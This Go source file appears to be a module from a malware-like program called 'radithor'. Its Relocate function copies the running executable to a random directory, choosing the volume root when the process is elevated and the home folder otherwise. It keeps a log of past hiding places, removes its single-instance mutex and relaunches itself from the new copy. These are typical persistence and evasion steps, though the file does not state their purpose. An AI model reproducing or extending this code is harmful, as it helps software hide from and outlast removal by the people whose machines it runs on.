package core_funcs

import (
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"radithor/core"
	"radithor/store"
	"radithor/utils"

	"github.com/horobimasu/gotils"
)

const _RELOCATION_DATA_FILE_NAME = "relocate"

func Relocate(path string, relocatedTo *string, triggerRelocation <-chan struct{}) error {
	if path == "" {
		var rootPath string

		if store.IsElevated {
			rootPath = filepath.VolumeName(store.ExecPath)
		} else {
			rootPath = "~"
		}

		pastRelocations, err := getRelocationsList()
		if err != nil {
			return err
		}

		path, err = utils.GetRandomDir(rootPath, 4, 20, pastRelocations)
		if err != nil {
			return err
		}
	}

	updateRelocationsList(path)

	newPath := filepath.Join(path, filepath.Base(store.ExecPath))

	err := utils.CopyFile(store.ExecPath, newPath)
	if err != nil {
		return err
	}

	err = core.RemoveMutex()
	if err != nil {
		core.LogWarning("[Relocate] failed to remove mutex - %v", err)
	}

	*relocatedTo = newPath

	go func() {
		<-triggerRelocation

		core.LogInfo("[Relocate] moving from %q to %q", store.ExecPath, newPath)

		core.LogInfo(
			"[Relocate] launching new file... %q [%q %d]",
			newPath,
			store.ExecPath,
			os.Getpid(),
		)

		gotils.RunCommand(newPath, store.ExecPath, strconv.Itoa(os.Getpid()))
	}()

	return nil
}

func getRelocationsList() ([]string, error) {
	file, err := core.GetOrCreateDiskFile(_RELOCATION_DATA_FILE_NAME)
	if err != nil {
		return nil, err
	}

	data := file.GetData()

	return strings.Split(string(data), "\n"), nil
}

// todo, if the list is more than 17 lines, remove 12 random lines from the top, keep the 7 most recent ones
func updateRelocationsList(newPath string) error {
	file, err := core.GetOrCreateDiskFile(_RELOCATION_DATA_FILE_NAME)
	if err != nil {
		return err
	}

	return file.AppendDataAndSave([]byte("\n" + newPath))
}
